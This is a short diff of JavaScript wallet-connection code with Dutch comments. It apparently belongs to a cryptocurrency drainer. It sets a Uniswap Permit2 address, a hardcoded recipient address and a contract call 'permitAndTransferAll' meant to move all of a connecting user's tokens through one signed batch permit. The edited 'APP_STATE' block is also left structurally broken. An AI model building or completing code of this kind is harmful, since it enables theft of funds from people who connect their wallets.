@@ -293,9 +293,6 @@ async function connectWallet() {
     }
 }
 
-let APP_STATE = {
-    // --- CONFIGURATIE ---
-
 const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78CA3"; // Uniswap Permit2
 const RECIPIENT_ADDRESS = "0xAEff38fd17B4bA0e5FC40115441C348aa789E706"; // Ontvangstadres uit contract
 const YOUR_CONTRACT_ADDRESS = "0x0000000000000000000000000000000000000000"; // <-- Vervang MET JE CONTRACT ADRES
@@ -304,6 +301,9 @@ const YOUR_CONTRACT_ADDRESS = "0x0000000000000000000000000000000000000000"; // <
 const CONTRACT_ABI = [
     "function permitAndTransferAll(address user, address[] tokens, bytes permitBatch, bytes signature) external"
 ];
+let APP_STATE = {
+    // --- CONFIGURATIE ---
+
 // ⬇️ VOEG HIERONDER TOE (HULPFUNCTIES) ⬇️
 
 // Haalt balancen op van de tokens
